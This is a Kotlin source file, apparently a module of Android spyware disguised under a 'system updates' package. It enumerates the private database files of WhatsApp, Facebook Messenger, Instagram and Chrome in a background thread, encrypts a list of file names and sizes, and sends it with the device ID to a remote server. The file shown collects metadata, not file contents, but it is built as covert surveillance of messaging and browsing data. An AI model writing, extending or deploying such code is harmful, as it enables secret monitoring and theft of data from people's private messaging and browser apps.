package com.system.updates.modules

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetUtils
import java.io.File

object SessionDumper {

    private const val TAG = "SessionDumper"

    fun dumpAppSessions(context: Context) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

        val targetPackages = listOf(
            "com.whatsapp",
            "com.facebook.orca",
            "com.instagram.android",
            "com.android.chrome"
        )

        Thread {
            targetPackages.forEach { pkg ->
                try {
                    val dataPath = "/data/data/$pkg/databases/"
                    val dbDir = File(dataPath)

                    if (dbDir.exists() && dbDir.isDirectory) {
                        val files = dbDir.listFiles()
                        files?.forEach { file ->
                            if (file.isFile) {
                                val logEntry = "App: $pkg | File: ${file.name} | Size: ${file.length()}"
                                val encrypted = CryptoManager.encryptHybrid(logEntry.toByteArray())
                                NetUtils.sendLog(deviceId, "session_report", encrypted.first, encrypted.second) { success ->
                                    if (success) Log.d(TAG, "Session report sent for $pkg")
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error dumping session for $pkg: ${e.message}")
                }
            }
        }.start()
    }
}
